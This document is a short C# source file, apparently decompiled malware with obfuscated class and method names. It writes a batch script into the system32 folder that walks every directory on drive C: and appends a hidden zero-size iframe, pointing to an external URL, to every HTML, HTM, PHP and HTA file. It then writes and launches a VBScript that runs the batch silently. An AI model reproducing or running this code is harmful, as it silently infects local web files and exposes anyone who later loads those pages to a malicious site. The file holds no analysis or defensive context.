using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class7
{
	public static void smethod_0()
	{
		FileStream stream = new FileStream("C:\\windows\\system32\\sys.bat", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("dir /s /ad /b C:\\* >tmp.dll");
		streamWriter.WriteLine("for /f \"delims=\" %%t in (tmp.dll) do (");
		streamWriter.WriteLine("for /f %%o in (%%t\\*.html,%%t\\*.htm,%%t\\*.php,%%t\\*.hta) do (");
		streamWriter.WriteLine("echo ^<iframe src=\"" + Class8.string_0 + "\"height=0 width=0^> >>%%o");
		streamWriter.WriteLine("))");
		streamWriter.Close();
		FileStream stream2 = new FileStream("C:\\windows\\system32\\exec.vbs", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter2 = new StreamWriter(stream2);
		streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter2.WriteLine("Dim oShell");
		streamWriter2.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
		streamWriter2.WriteLine("oShell.run \"C:\\windows\\system32\\sys.bat\",0,True");
		streamWriter2.WriteLine("Set oShell = Nothing ");
		streamWriter2.Close();
		Process.Start("C:\\windows\\system32\\exec.vbs");
	}
}
